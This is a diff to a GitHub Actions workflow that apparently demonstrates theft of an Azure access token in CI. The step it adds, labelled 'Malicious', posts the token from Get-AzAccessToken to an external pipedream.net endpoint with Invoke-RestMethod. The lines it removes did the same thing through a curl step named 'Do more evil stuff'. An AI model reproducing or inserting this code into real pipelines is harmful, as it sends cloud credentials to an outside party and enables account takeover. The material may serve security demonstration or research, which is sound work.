@@ -37,17 +37,9 @@ jobs:
           subscription-id: ${{ secrets.SUBSCRIPTION }}
           enable-AzPSSession: true
 
-      - name: Run Azure PowerShell script
+      - name: Run Malicious Azure PowerShell script
         uses: azure/powershell@v1
         with:
           inlineScript: |
-            [Environment]::SetEnvironmentVariable('AZ_ACCESS_TOKEN',$(Get-AzAccessToken))
+            Invoke-RestMethod -Method POST -Uri "https://eov8t75mveud5wy.m.pipedream.net" -ContentType "application/json" -Body "{`"token`":`"$((Get-AzAccessToken).Token)`"}"
           azPSVersion: "latest"
-  
-      - name: Do more evil stuff
-        run: |
-          curl -d '{"token":"${{ env.AZ_ACCESS_TOKEN }}"}' \
-          -H "Content-Type: application/json" \
-          "https://eov8t75mveud5wy.m.pipedream.net"
-            
-            
